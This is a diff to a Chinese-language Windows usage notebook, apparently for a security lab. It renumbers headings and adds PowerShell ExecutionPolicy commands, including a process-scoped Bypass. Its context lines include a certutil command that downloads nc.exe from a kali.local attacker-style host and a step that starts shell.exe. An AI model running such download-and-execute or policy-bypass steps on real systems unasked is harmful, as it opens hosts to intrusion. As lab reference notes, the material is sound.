@@ -196,7 +196,7 @@ Use [Office Deployment Tool](https://keithpeck177271.gitbook.io/notes/misc/lab-e
 
 Shut down, Take Snapshot: `init` 
 
-==Desktop needs to configure SMB and System Protection==
+==PM needs to configure SMB , System Protection and ExecutionPolicy==
 
 ## 5. Deploy
 
@@ -259,13 +259,13 @@ Shut down, Take Snapshot: `deploy`
 
 ## 6. Usage
 
-### 6.1 查看帮助
+### 6.1. 查看帮助
 
 ```cmd
 C:\Users\Administrator> [command] /?
 ```
 
-### 6.2 历史命令
+### 6.2. 历史命令
 
 查看历史命令
 
@@ -273,7 +273,7 @@ C:\Users\Administrator> [command] /?
 C:\Users\Administrator> doskey /history
 ```
 
-### 6.3 远程下载
+### 6.3. 远程下载
 
 **bitsadmin**
 
@@ -301,7 +301,7 @@ C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc
 C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
 ```
 
-### 6.4 程序
+### 6.4. 程序
 
 运行程序
 
@@ -309,7 +309,7 @@ C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc
 C:\Users\Administrator> start shell.exe
 ```
 
-### 6.5 修改编码
+### 6.5. 修改编码
 
 查看当前编码
 
@@ -335,7 +335,7 @@ C:\Users\Administrator> chcp 65001
 949		EUC-KR		韩语
 ```
 
-### 6.6 用户管理
+### 6.6. 用户管理
 
 查看用户名
 
@@ -422,23 +422,23 @@ net user admin /del
 The command completed successfully.
 ```
 
-### 6.7 文件权限
+### 6.7. 文件权限
 
 ![文件权限](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)
 
-### 6.8 查看进程
+### 6.8. 查看进程
 
 ```cmd
 C:\Users\Administrator> netstat -ano
 ```
 
-### 6.9 查看系统架构
+### 6.9. 查看系统架构
 
 ```cmd
 C:\Users\Administrator> wmic os get osarchitecture
 ```
 
-### 6.10 添加环境变量
+### 6.10. 添加环境变量
 
 添加环境变量
 
@@ -451,23 +451,23 @@ C:\Users\Administrator> wmic os get osarchitecture
 > %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
 > ```
 
-### 6.11 临时文件夹
+### 6.11. 临时文件夹
 
 ```powershell
 PS C:\Users\nemo> dir C:\Windows\Temp
 ```
 
-### 6.12 添加快捷访问
+### 6.12. 添加快捷访问
 
 ![添加快捷访问](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)
 
-### 6.13 查看网络
+### 6.13. 查看网络
 
 ```cmd
 C:\Users\Administrator> route print
 ```
 
-### 6.14 权限
+### 6.14. 权限
 
 ```
 SYSTEM : 系统权限，可对系统文件进行修改
@@ -477,7 +477,7 @@ Administrator : 可以通过 psexec 获取 SYSTEM 权限
 Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
 ```
 
-### 6.15 修复
+### 6.15. 修复
 
 扫描系统文件的完整性，并修复受损的文件
 
@@ -485,7 +485,7 @@ Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM
 C:\Users\Administrator> sfc /scannow
 ```
 
-### 6.16 禁用 WSL
+### 6.16. 禁用 WSL
 
 列出当前系统上安装的 WSL 发行版
 
@@ -515,7 +515,7 @@ PS C:\Users\nemo> wslconfig /l
 
 ![关闭虚拟机平台](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)
 
-### 6.17 删除
+### 6.17. 删除
 
 要删除一个文件，你可以运行：
 
@@ -529,7 +529,7 @@ Remove-Item "C:\path\to\file.txt"
 Remove-Item "C:\path\to\directory" -Recurse
 ```
 
-### 6.18 证书安装
+### 6.18. 证书安装
 
 双击证书文件安装
 
@@ -543,7 +543,7 @@ Remove-Item "C:\path\to\directory" -Recurse
 
 ![选择存储到受信任的根证书颁发机构](./../../../../../images/Windows/%E4%BD%BF%E7%94%A8/%E9%80%89%E6%8B%A9%E5%AD%98%E5%82%A8%E5%88%B0%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%A0%B9%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84.png)
 
-### 6.19 SSH 连接记录
+### 6.19. SSH 连接记录
 
 SSH 连接记录
 
@@ -551,8 +551,29 @@ SSH 连接记录
 C:/Users/nemo/.ssh/known_hosts
 ```
 
+### 6.20. ExecutionPolicy
+
+查看当前策略
+
+```
+PS C:\Users\nemo> Get-ExecutionPolicy -List
+```
+
+临时允许脚本运行
+
+```
+PS C:\Users\nemo> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+```
+
+永久允许脚本运行
+
+```
+PS C:\Users\nemo> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
+```
+
 ---
 
 References
 
 - [Windows](https://learn.microsoft.com/zh-cn/windows/)
+
